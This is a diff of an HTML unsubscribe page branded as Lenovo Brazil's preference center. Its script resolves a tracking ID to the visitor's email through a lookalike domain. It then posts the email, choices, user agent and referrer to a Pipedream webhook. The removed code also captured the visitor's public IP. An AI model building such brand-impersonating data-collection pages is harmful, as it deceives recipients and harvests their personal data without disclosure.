+                            </label>
+                        </div>
+                    </div>
 
-  const email = document.getElementById("email").value;
-  const preference = document.getElementById("preference").value;
-
-  if (!email) {
-    alert("Informe o e-mail.");
-    return;
-  }
-
-  // 🔐 Token único
-  const uid = crypto.randomUUID();
-
-  // 🌍 IP público
-  const ip = await fetch("https://api.ipify.org?format=json")
-    .then(r => r.json())
-    .then(d => d.ip)
-    .catch(() => "unknown");
-
-  // 📦 Payload
-  const payload = {
-    event: "unsubscribe",
-    uid: uid,
-    email: email,
-    preference: preference,
-    ip: ip,
-    userAgent: navigator.userAgent,
-    timestamp: new Date().toISOString()
-  };
-
-  // 🔔 Webhook (Vonage)
-  fetch("SEU_WEBHOOK_VONAGE", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  });
-
-  // ✅ Feedback visual
-  document.getElementById("formBox").innerHTML = `
-    <div class="success">
-      <h2>Você foi descadastrado com sucesso!</h2>
+                    <div class="form-group" style="text-align: center; margin-top: 40px;">
+                        <button type="submit" class="btn-submit" id="submitBtn">
+                            Salvar Preferências
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </div>
     </div>
-  `;
-}
-</script>
 
+    <div class="success-page" id="successPage">
+        <div class="container">
+            <div class="success-icon">
+                <i class="fas fa-check"></i>
+            </div>
+            <h2>Preferências Salvas com Sucesso!</h2>
+            <p>Suas preferências foram atualizadas e você receberá comunicações de acordo com suas escolhas.</p>
+            <p style="color: #999; font-size: 16px;">Obrigado por usar a Central de Preferências Lenovo.</p>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="container">
+            <p>&copy; 2026 Lenovo. Todos os direitos reservados.</p>
+            <p>
+                <a href="https://www.lenovo.com/br/pt/privacy/">Privacidade</a>
+                <a href="https://www.lenovo.com/br/pt/legal/">Informações Legais</a>
+            </p>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+
+    <script>
+    // ==========================================
+    // CONFIGURAÇÃO - AJUSTE SUAS URLs AQUI
+    // ==========================================
+    const WEBHOOK_URL = 'https://eotz4wvybe4cndl.m.pipedream.net';
+    const TRACKING_API = 'https://marketingbrlenovo.com.br/api/unsubscribe.php';
+    
+    (function() {
+        // Captura o tracking ID da URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const trackingId = urlParams.get('id');
+        
+        // Se tiver tracking ID, busca informações do email
+        if (trackingId) {
+            buscarEmailPorTracking(trackingId);
+        }
+        
+        const sessionToken = 'LEN' + Date.now().toString(36) + Math.random().toString(36).substr(2, 5).toUpperCase();
+        
+        async function buscarEmailPorTracking(trackingId) {
+            try {
+                // Tenta buscar email associado ao tracking ID
+                const response = await fetch(`${TRACKING_API}?action=get_email&id=${trackingId}`, {
+                    method: 'GET'
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.email) {
+                        document.getElementById('email').value = data.email;
+                        document.getElementById('emailFromTracking').textContent = data.email;
+                        document.getElementById('trackingInfo').style.display = 'block';
+                    }
+                }
+            } catch (err) {
+                console.log('Não foi possível buscar email do tracking');
+            }
+        }
+        
+        function capturarDados() {
+            const email = document.getElementById('email').value;
+            const comunicacao = Array.from(document.querySelectorAll('input[name="comunicacao"]:checked')).map(cb => cb.value);
+            const pausa = document.querySelector('input[name="pausa"]:checked')?.value || 'Sem pausa';
+            const unsubscribed = document.getElementById('unsubscribe').checked;
+            
+            return {
+                tracking_id: trackingId || null,
+                email,
+                comunicacao,
+                pausa,
+                unsubscribed,
+                timestamp: new Date().toISOString(),
+                user_agent: navigator.userAgent,
+                referrer: document.referrer
+            };
+        }
+        
+        async function enviarWebhook(dados) {
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(dados)
+                });
+                return true;
+            } catch (err) {
+                return false;
+            }
+        }
+        
+        async function registrarDescadastro(dados) {
+            if (!trackingId) return false;
+            
+            try {
+                // Envia para o servidor de tracking
+                const response = await fetch(TRACKING_API, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        action: 'unsubscribe',
+                        tracking_id: trackingId,
+                        email: dados.email,
+                        preferences: {
+                            comunicacao: dados.comunicacao,
+                            pausa: dados.pausa,
+                            unsubscribed: dados.unsubscribed
+                        },
+                        timestamp: dados.timestamp,
+                        user_agent: dados.user_agent
+                    })
+                });
+                return response.ok;
+            } catch (err) {
+                console.log('Erro ao registrar descadastro:', err);
+                return false;
+            }
+        }
+        
+        function mostrarSucesso() {
+            document.getElementById('formPage').classList.add('hidden');
+            document.getElementById('successPage').classList.add('active');
+            window.scrollTo(0, 0);
+        }
+        
+        document.getElementById('preferencesForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Enviando...';
+            
+            const dados = capturarDados();
+            
+            // Envia para webhook (Pipedream)
+            await enviarWebhook(dados);
+            
+            // Registra no sistema de tracking (se tiver tracking_id)
+            if (trackingId) {
+                await registrarDescadastro(dados);
+            }
+            
+            setTimeout(() => {
+                mostrarSucesso();
+            }, 1000);
+        });
+    }());
+    </script>
 </body>
 </html>
